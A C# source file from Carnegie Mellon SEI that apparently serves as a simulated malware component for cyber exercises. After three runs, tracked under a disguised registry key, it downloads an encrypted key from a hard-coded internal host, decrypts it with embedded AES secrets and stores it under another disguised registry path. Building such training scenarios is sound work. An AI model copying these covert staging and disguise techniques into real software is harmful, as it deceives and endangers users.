/*
Copyright 2023 Carnegie Mellon University.
Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
root or contact permission@sei.cmu.edu for full terms.
*/

using System.Net;
using System.Security.Cryptography;
using Microsoft.Win32;

namespace eugnxt
{
    public class Class1
    {
        public async Task<string> Run()
        {
            string decryptionkey = string.Empty;
            string iv = "Gh56tref89aQwv4u";
            string key = "jHrtUd0weG43qas9";

            try
            {
                RegistryKey registryKeyRunCount = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Fax\UserInfo", true);
                int runCount = 0;

                if (registryKeyRunCount == null)
                {
                    Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Fax\UserInfo");
                    registryKeyRunCount = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Fax\UserInfo", true);
                }

                if (!registryKeyRunCount.GetValueNames().Contains("runcount"))
                {
                    registryKeyRunCount.SetValue("runcount", 1);
                }
                else
                {
                    runCount = Convert.ToInt32(registryKeyRunCount.GetValue("runcount"));
                    runCount++;
                    registryKeyRunCount.SetValue("runcount", runCount);
                }

                if (runCount >= 3)
                {
                    // request the encryption/decryption key and place in registry
                    WebClient webClient = new WebClient();
                    decryptionkey = webClient.DownloadString("http://10.5.5.219/reg/registrytoken.txt");
                    decryptionkey = DecryptAESString(decryptionkey, key, iv);

                    RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Setup\Adsvcexec", true);

                    if (registryKey == null)
                    {
                        Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Setup\Adsvcexec");
                        registryKey = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Setup\Adsvcexec", true);
                    }

                    registryKey.SetValue("decryptionkey", decryptionkey);
                }
            }
            catch (Exception exc)
            {
                Console.WriteLine(exc.StackTrace + Environment.NewLine + exc.Message);
            }

            return string.Empty;
        }

        private string DecryptAESString(string encryptedText, string key, string iv)
        {
            string decryptedText = null;

            using (Aes aes = Aes.Create())
            {
                aes.Key = System.Text.Encoding.Default.GetBytes(key);
                aes.IV = System.Text.Encoding.Default.GetBytes(iv);

                ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV);

                using (MemoryStream memoryStream = new MemoryStream(System.Convert.FromBase64String(encryptedText)))
                {
                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader streamReader = new StreamReader(cryptoStream))
                        {
                            decryptedText = streamReader.ReadToEnd();
                        }
                    }
                }
            }

            return decryptedText;
        }
    }
}
